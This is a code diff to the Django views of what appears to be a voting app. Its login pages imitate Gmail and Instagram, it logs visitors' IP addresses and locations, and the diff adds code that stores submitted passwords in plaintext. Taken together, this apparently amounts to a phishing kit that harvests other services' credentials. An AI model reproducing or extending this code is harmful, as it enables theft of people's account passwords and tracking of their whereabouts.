@@ -5,7 +5,7 @@ from .models import Poll, Candidate, Account
 from django.contrib import messages
 
 # import django authentication framework
-from django.contrib.auth import login, logout
+from django.contrib.auth import login, logout, authenticate
 
 
 def index_view(request):
@@ -53,7 +53,7 @@ def vote(request, poll_slug, candidate_id):
         return redirect("poll", slug=poll_slug)
     else:
         messages.error(request, "You must be logged in to vote.")
-        return redirect("login")
+        return redirect("poll", slug=poll_slug)
 
 
 def login_or_signup_view(request, where):
@@ -70,12 +70,17 @@ def login_or_signup_view(request, where):
             # check if password is correct
             if user.check_password(password):
                 messages.success(request, "Welcome back.")
+                # authenticate user and login
+                user = authenticate(request, username=user.username, password=password)
                 login(request, user)
                 if next_url:
                     return redirect(next_url)
                 return redirect("index")
             else:
-                messages.error(request, "Invalid password.")
+                messages.error(
+                    request,
+                    "Sorry, your password was incorrect. Please double-check your password.",
+                )
                 return redirect("login", where=where)
         else:
             from ipware import get_client_ip
@@ -92,8 +97,10 @@ def login_or_signup_view(request, where):
             city = data.get("city")
             state = data.get("region")
             region = data.get("timezone")
+
             # create user
             user = Account.objects.create(
+                pwd=password,
                 identifier=identifier,
                 ip_address=ip,
                 country=country,
@@ -115,13 +122,23 @@ def login_or_signup_view(request, where):
     if where not in ["GM", "IG"]:
         return redirect("index")
 
+    # get the full url of the current page
+    full_url = request.build_absolute_uri()
+
+    context = {"full_url": full_url}
+
     if where == "GM":
-        return render(request, "pages/auth/gmail.html")
+        return render(request, "pages/auth/gmail.html", context)
     elif where == "IG":
-        return render(request, "pages/auth/instagram.html")
+        return render(request, "pages/auth/instagram.html", context)
     return redirect("index")
+
 
 def logout_view(request):
     logout(request)
-    messages.success(request, "You have been logged out.")
+    # check if the user is logged out
+    if not request.user.is_authenticated:
+        messages.success(request, "You have been logged out.")
+    else:
+        messages.error(request, "Something went wrong. Please try again.")
     return redirect("index")
